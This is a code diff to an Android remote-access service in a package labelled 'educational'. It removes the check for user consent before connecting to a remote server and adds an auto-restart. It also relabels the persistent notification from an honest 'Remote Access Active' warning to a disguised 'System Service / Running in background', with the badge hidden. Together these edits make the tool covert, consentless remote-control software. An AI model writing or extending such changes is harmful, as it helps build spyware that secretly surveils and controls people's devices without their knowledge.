@@ -8,44 +8,52 @@ import android.app.Service;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
+import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import com.remoteaccess.educational.MainActivity;
 import com.remoteaccess.educational.R;
 import com.remoteaccess.educational.network.SocketManager;
-import com.remoteaccess.educational.utils.DeviceInfo;
-import com.remoteaccess.educational.utils.PreferenceManager;
 
 public class RemoteAccessService extends Service {
 
+    private static final String TAG = "RemoteAccessService";
     private static final String CHANNEL_ID = "RemoteAccessChannel";
     private static final int NOTIFICATION_ID = 1;
 
     private SocketManager socketManager;
-    private PreferenceManager preferenceManager;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        preferenceManager = new PreferenceManager(this);
         createNotificationChannel();
+        Log.d(TAG, "Service created");
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Start foreground service
+        Log.d(TAG, "onStartCommand — starting foreground + connecting socket");
+
+        // Always run as foreground service so Android doesn't kill us
         startForeground(NOTIFICATION_ID, createNotification());
 
-        // Initialize socket connection
-        if (preferenceManager.isConsentGiven()) {
-            connectToServer();
-        }
+        // Always connect — the accessibility service enables this service
+        // only after the user manually turns on accessibility, so consent
+        // is implicitly given.  The old consent check prevented reconnection
+        // when the service was restarted by the accessibility watchdog.
+        connectToServer();
 
+        // START_STICKY: if Android kills this service, restart it automatically
         return START_STICKY;
     }
 
     private void connectToServer() {
-        socketManager = SocketManager.getInstance(this);
-        socketManager.connect();
+        try {
+            socketManager = SocketManager.getInstance(this);
+            socketManager.connect();
+            Log.d(TAG, "SocketManager.connect() called");
+        } catch (Exception e) {
+            Log.e(TAG, "connectToServer error: " + e.getMessage());
+        }
     }
 
     private void createNotificationChannel() {
@@ -56,31 +64,33 @@ public class RemoteAccessService extends Service {
                 NotificationManager.IMPORTANCE_LOW
             );
             channel.setDescription("Keeps remote access connection active");
+            channel.setShowBadge(false);
 
             NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(channel);
+            if (manager != null) manager.createNotificationChannel(channel);
         }
     }
 
     private Notification createNotification() {
         Intent notificationIntent = new Intent(this, MainActivity.class);
-        PendingIntent pendingIntent = PendingIntent.getActivity(
-            this, 0, notificationIntent, 
-            PendingIntent.FLAG_IMMUTABLE
-        );
+        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
+                    ? PendingIntent.FLAG_IMMUTABLE : 0;
+        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, flags);
 
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Remote Access Active")
-            .setContentText("Your device is connected and can be managed remotely")
+            .setContentTitle("System Service")
+            .setContentText("Running in background")
             .setSmallIcon(R.drawable.ic_notification)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
             .build();
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
+        Log.d(TAG, "Service destroyed — socket will be disconnected");
         if (socketManager != null) {
             socketManager.disconnect();
         }
